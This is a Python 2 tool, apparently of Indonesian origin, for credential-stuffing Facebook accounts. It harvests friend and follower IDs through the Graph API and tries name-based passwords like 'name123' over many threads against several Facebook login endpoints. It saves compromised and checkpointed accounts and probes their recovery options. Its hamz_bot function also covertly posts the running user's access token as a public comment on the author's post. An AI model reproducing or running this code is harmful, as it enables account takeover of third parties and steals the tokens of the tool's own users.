# -*- coding: utf-8
#BY : Farel Ganteng Banget
#Recode? izin dulu bos.
import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool

#### WARNA RANDOM ####
P  = '\033[1;97m'  # biru
M  = '\033[1;91m' # biru
H  = '\033[1;92m' # biru
K = '\033[1;93m' # biru
B  = '\033[1;94m' # biru
U  = '\033[1;95m' # biru
O = '\033[1;96m' # kuning

my_color = [P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)

import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import requests
import uuid
import ipaddress
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from time import sleep
from datetime import datetime
try:
	import requests
except ImportError:
	print '[×] Modul requests belum terinstall!...\n'
	os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
	
import os, sys, re, time, requests, calendar, random
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date

reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1

def random_ipv4():
	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

def logo():
	print("""     
┌────────────────────────────────────────────────────────┐
│                                                        │
│          
      ██████╗███╗   ███╗██████╗ ███████╗  
     ██╔════╝████╗ ████║██╔══██╗██╔════╝    
     ██║     ██╔████╔██║██████╔╝█████╗      
     ██║     ██║╚██╔╝██║██╔══██╗██╔══╝      
     ╚██████╗██║ ╚═╝ ██║██████╔╝██║         
      ╚═════╝╚═╝     ╚═╝╚═════╝ ╚═╝         
       \033[1;95m SHR NEVER DIE | \033[1;96m MULTI | \033[1;91m BRUTE | \033[1;93m FORCE    
                                 
                                                
│                               \033[1;93mMy Name \033[1;92m: \033[1;96mFarel Gans🗿🙏 │
└────────────────────────────────────────────────────────┘""""")
id = []
cp = []
ok = []
loop = 0
s = requests.Session()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
ua = s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text

ct = datetime.now()
n = ct.month
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
	if n < 0 or n > 12:
		exit() 
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
ta = current.year
bu = current.month
ho = current.day
op = bulan[nTemp]

my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ho, op, ta))
tgl = ("%s %s %s"%(ho, op, ta))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

useragents = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 Instagram 138.0.0.28.117 Android (29/10; 440dpi; 1080x2210; Xiaomi; Mi 9T Pro; raphael; qcom; fr_FR; 210180522)'

def masuk():
	os.system('clear')
	try:
		token = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		logo()
		print("\033[0;95m Gada Token? Ketik '\033[0;92mxyz\033[0;95m' Untuk Mendapatkan Token Gratis.")
		token = raw_input(" masukin token nya ngap : ")
		if token == "xyz":
			os.system("xdg-open https://free.facebook.com/100059454248601/posts/213614107297063/?app=fbl")
			exit(" AWOKWOWKWAWOK AMBIL AJA DISITU TOKENYA")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open("login.txt", 'w')
			zedd.write(token)
			zedd.close()
			print (" √ login berhasil ")
			hamz_bot()
		except KeyError:
			print (" × token invalid") 
			sys.exit()
    
def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print (' • kesalahan tidak bisa crack')
		os.system("rm -f login.txt")
		masuk()
	except requests.exceptions.ConnectionError:
		print (' × tidak ada koneksi harap sambungkan koneksi anda')
		sys.exit()
	logo()
	print" \033[0;95m  NAMA       : "+nama
	print" \033[0;95m  IP ADDRESS : "+ip
	print" \033[0;94m  #-----------------------------------#"
	print" \033[0;96m  [1] CRACK DARI ID PUBLIK"
	print" \033[0;96m  [2] CRACK DARI FOLLOWERS"
	print" \033[0;96m  [3] CEK HASIL OPSI"
	print" \033[0;96m  [4] LIHAT HASIL CRACK"
	print" \033[0;96m  [0] HAPUS TOKEN"
	print
	pilih()
	
###PILIHHH ###
def pilih():
	kontol = raw_input("\033[1;95m  ┌─[FAREL | GANTENG└──╼ ❯❯❯ \033[92m :\033[1;92m ")
	if kontol == "":
		menu()
	elif kontol == "1":
		publik()
		method()
	elif kontol == "2":
		follower()
		methode()
	elif kontol == "3":
		ingfo()
	elif kontol == "4":
		print("\n [1] cek hasil crack OK")
		print(" [2] cek hasil crack CP")
		cek = raw_input("\n [?] choose : ")
		if cek =="":
			menu()
		elif cek == "1":
			dirs = os.listdir("OK")
			print(" [*] list nama file tersimpan di folder OK\n")
			for file in dirs:
				print(" [+] "+file)
			try:
				file = raw_input("\n [?] pilih nama file : ")
				if file == "":
					menu()
				totalok = open("OK/%s"%(file)).read().splitlines()
			except IOError:
				exit(" [!] file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" [#] ----------------------------------------------")
			print(" [+] hasil crack : %s total : %s\033[0;92m"%(del_txt, len(totalok)))
			os.system("cat OK/%s"%(file))
			print("\033[0;97m [#] ----------------------------------------------")
			exit(" [!] jangan lupa di copy dan di simpan hasilnya")
		elif cek == "2":
			dirs = os.listdir("CP")
			print(" [*] list nama file tersimpan di folder CP\n")
			for file in dirs:
				print(" [+] "+file)
			try:
				file = raw_input("\n [?] pilih nama file : ")
				if file == "":
					menu()
				totalcp = open("CP/%s"%(file)).read().splitlines()
			except IOError:
				exit(" [!] file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" [#] ----------------------------------------------")
			print(" [+] hasil crack : %s total : %s\033[0;93m"%(del_txt, len(totalcp)))
			os.system("cat CP/%s"%(file))
			print("\033[0;97m [#] ----------------------------------------------")
			exit(" [!] jangan lupa di copy dan di simpan hasilnya")
		else:
			menu()
	elif kontol == "0" or ask == "00":
		os.system("rm -f login.txt") 
		print (" √ berhasil menghapus token") 
		exit()

### PUBLICK ###
def publik():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	print("\n [*] isi 'me' jika ingin dari daftar teman")
	idt = raw_input(" [+] id target : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" [!] akun tidak tersedia atau list teman private")
	print(" [+] total id  : \033[0;91m%s\033[0;97m"%(len(id)))

### FOLLOWERS ###
def follower():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	print("\n [*] isi 'me' jika ingin dari pengikut sendiri")
	idt = raw_input(" [+] id target : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" [!] akun tidak tersedia atau list teman private")
	print(" [+] total id  : \033[0;91m%s\033[0;97m"%(len(id))) 
	
def method():
	print(" \033[1;96m Coba Cek satu - satu methode nya. ")
	print(" \033[1;93m[1] method api (\033[1;92mFast Crack)")
	print(" \033[1;93m[2] method free (\033[1;92mFast Crack)")
	print(" \033[1;93m[3] method mbasic (\033[1;92mSlow Crack)")
	print(" \033[1;93m[4] method mobile (\033[1;92mSlow Crack)")
	method = raw_input("\n [+] method : ")
	if method == "":
		menu()
	elif method == "1":
		ask = raw_input(" [?] gunakan password manual? y/t: ")
		if ask == "y":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [*] contoh pass : sayang,anjing,bangsat")
				asu = raw_input(" [?] set pass : ").split(",")
				if len(asu) =="":
					exit(" [!] jangan kosong")
				print("\n [+] hasil OK tersimpan di : OK/%s.txt"%(tanggal))
				print(" [+] hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(api, uid, asu)
			exit("\n\n [#] crack selesai...")
		elif ask == "t":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [+] hasil OK tersimpan di : OK/%s.txt"%(tanggal))
				print(" [+] hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						pwx = [ name+"123", name+"12345" ]
					elif len(name) == 3 or len(name) == 4 or len(name) == 5:
						pwx = [ name+"123", name+"12345" ]
					else:
						pwx = [ name+"123", name+"12345" ]
					coeg.submit(api, uid, pwx)
			exit("\n\n [#] crack selesai...")
	elif method == "2":
		ask = raw_input(" [?] gunakan password manual? y/t: ")
		if ask == "y":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [*] contoh pass : sayang,anjing,bangsat")
				asu = raw_input(" [?] set pass : ").split(",")
				if len(asu) =="":
					exit(" [!] jangan kosong")
				print("\n [+] hasil OK tersimpan di : OK/%s.txt"%(tanggal))
				print(" [+] hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(crack, uid, asu, "https:/free.facebook.com")
			exit("\n\n [#] crack selesai...")
		elif ask == "t":
			with ThreadPoolExecutor(max_workers=35) as coeg:
				print("\n [+] hasil OK tersimpan di : OK/%s.txt"%(tanggal))
				print(" [+] hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						pwx = [ name+"123", name+"12345" ]
					elif len(name) == 3 or len(name) == 4 or len(name) == 5:
						pwx = [ name+"123", name+"12345" ]
					else:
						pwx = [ name+"123", name+"12345" ]
					coeg.submit(crack, uid, pwx, "https://free.facebook.com")
			exit("\n\n [#] crack selesai...")
	elif method == "3":
		ask = raw_input(" [?] gunakan password manual? y/t: ")
		if ask == "y":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [*] contoh pass : sayang,anjing,bangsat")
				asu = raw_input(" [?] set pass : ").split(",")
				if len(asu) =="":
					exit(" [!] jangan kosong")
				print("\n [+] hasil OK tersimpan di : OK/%s.txt"%(tanggal))
				print(" [+] hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(crack, uid, asu, "https://mbasic.facebook.com")
			exit("\n\n [#] crack selesai...")
		elif ask == "t":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [+] hasil OK tersimpan di : OK/%s.txt"%(tanggal))
				print(" [+] hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						pwx = [ name+"123", name+"12345" ]
					elif len(name) == 3 or len(name) == 4 or len(name) == 5:
						pwx = [ name+"123", name+"12345" ]
					else:
						pwx = [ name+"123", name+"12345" ]
					coeg.submit(crack, uid, pwx, "https://mbasic.facebook.com")
			exit("\n\n [#] crack selesai...")
	elif method == "4":
		ask = raw_input(" [?] gunakan password manual? y/t: ")
		if ask == "y":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [*] contoh pass : sayang,anjing,bangsat")
				asu = raw_input(" [?] set pass : ").split(",")
				if len(asu) =="":
					exit(" [!] jangan kosong")
				print("\n [+] hasil OK tersimpan di : OK/%s.txt"%(tanggal))
				print(" [+] hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(crack, uid, asu, "https://m.facebook.com")
			exit("\n\n [#] crack selesai...")
		elif ask == "t":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [+] hasil OK tersimpan di : OK/%s.txt"%(tanggal))
				print(" [+] hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						pwx = [ name+"123", name+"12345" ]
					elif len(name) == 3 or len(name) == 4 or len(name) == 5:
						pwx = [ name+"123", name+"12345" ]
					else:
						pwx = [ name+"123", name+"12345" ]
					coeg.submit(crack, uid, pwx, "https://m.facebook.com")
			exit("\n\n [#] crack selesai...")
		else:
			exit("\n [!] isi yang bener")
	else:
		menu() 

def api(uid, pwx):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r [*] crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		ses = requests.Session()
		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
		if "session_key" in send.text and "EAAA" in send.text:
			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
			break
		elif "www.facebook.com" in send.json()["error_msg"]:
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def crack(uid, pwx, host, **kwargs):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r [*] crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				try:
					token = open("login.txt", "r").read()
					with requests.Session() as ses:
						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
						month, day, year = ttl.split("/")
						month = bulan_ttl[month]
						print("\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
						cp.append("%s|%s"%(uid, pw))
						open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
						break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue

		loop+=1
	except Exception as e:
		if "free.facebook.com" in host:
			return crack(uid, pwx, host)
		else:
			return crack(uid, pwx, "https://free.facebook.com")
			
### CEK OPSI ###
def ingfo():
	print("\n [*] masukan file (ex: CP/%s.txt)"%(tanggal))
	files = raw_input(" [?] nama file  : ")
	if files == "":
		menu()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n [!] nama file %s tidak tersedia"%(files))
	print(" [+] total akun : \033[0;91m%s\033[0;97m"%(len(buka_baju)))
	print(" [*] sedang prosess cek akun....")
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print("\n [+] cek akun : \033[0;93m%s\033[0;97m"%(kontol.replace("  * --> ","")))
		try:
			check_in(titid[0].replace("  * --> ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	print("\n [!] cek akun sudah selesai...")
	raw_input(" [+] pencet enter untuk kembali ke menu ")
	time.sleep(1)
	menu()
	
def check_in(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36")
	ses = requests.Session()
	#-> pemisah
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print(" [+] aplikasi terhubung ada : "+str(len(xe)))
		num = 0
		for _ in xe:
			num += 1
			print("   "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print(" [+] terdapat "+str(len(ngew))+" opsi ")
		for opt in range(len(ngew)):
			print(" ["+str(opt+1)+"] "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" [!] %s"%(oh))
	else:
		print(" [!] login gagal, silahkan cek kembali id dan password")
	
def buat_folder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass   
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.0012)
 
# KALO MAU NAMBAH? NAMBAH AJA JANGAN DI GANTI. #       
def hamz_bot():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print (' [!] Token invalid') 
        os.system('rm -rf login.txt')
    kom = " Bang @[1801249672:] Keren Bang😱🗿😱🗿😱 Ijin pake scnya bang"
    requests.post('https://graph.facebook.com/1801249672/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/10216974143784753/comments/?message=' +token+ '&access_token=' + token)
    requests.post('https://graph.facebook.com/10216974143784753/comments/?message=' +kom+ '&access_token=' + token)
    menu()
    
        
if __name__ == "__main__":
	os.system("git pull")
	os.system("touch login.txt")
	buat_folder()
	masuk()
	
